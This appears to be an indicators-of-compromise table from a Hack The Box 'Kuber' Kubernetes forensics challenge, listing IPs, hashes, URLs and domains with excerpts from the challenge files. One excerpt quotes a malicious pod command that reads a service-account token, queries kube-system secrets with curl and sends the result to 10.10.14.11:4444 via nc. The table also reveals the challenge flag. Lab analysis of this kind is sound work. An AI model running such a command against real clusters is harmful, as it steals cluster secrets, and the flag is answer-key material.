# IOCs - Kuber

| Type | Value | Context |
| --- | --- | --- |
| IPv4 | 10.43.191.212 | labels: app: ssh-deployment name: ssh-deployment namespace: kube-system spec: clusterIP: 10.43.191.212 clusterIPs: - 10.43.191.212 externalTrafficPolicy: Cluster internalTrafficPol |
| IPv4 | 10.10.14.11 | ation/json" https://10.43.191.212:8443/api/v1/namespaces/kube- system/secrets; } \| nc -nv 10.10.14.11 4444; sleep 100000' command: - /bin/sh image: alpine imagePullPolicy: Always n |
| Hash | a632a03355131c8c0d8a67bddda24e98 | scalate privileges to gain full access to the host system. Artefacts provided Kuber.zip - a632a03355131c8c0d8a67bddda24e98 Skills Learnt Kubernetes resource configuration Analysis |
| Hash | 1d2d2b861c5f8631f841b57f327f46f8 | \| yq '.items[] \| select(.metadata.name == "ssh- config")' apiVersion: v1 data: FLAG: HTB{1d2d2b861c5f8631f841b57f327f46f8} PASSWORD_ACCESS: "true" PGID: "1000" PUID: "1000" SUDO_AC |
| URL | https://10.43.191.212:8443/api/v1/namespaces/kube- | TOKEN; curl - k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://10.43.191.212:8443/api/v1/namespaces/kube- system/secrets; } \| nc -nv 10.10.14.11 4 |
| URL | https://localhost:8443/api/v1/namespaces/kube- | ad TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"https://localhost:8443/api/v1/namespaces/kube- system/secrets; } \| nc -nv 10.10.14.11 4444 |
| Domain | kubernetes.io | true containers: - args: - -c - 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token \| { read TOKEN; curl - k -v -H "Authorization: Bearer $T |
| Domain | docker.io | ommand: - /bin/sh image: alpine imagePullPolicy: Always name: alpine <SNIP> <SNIP> image: docker.io/library/alpine:latest imageID: docker.io/library/alpine@sha256:0a4eaa0eecf5f8c05 |
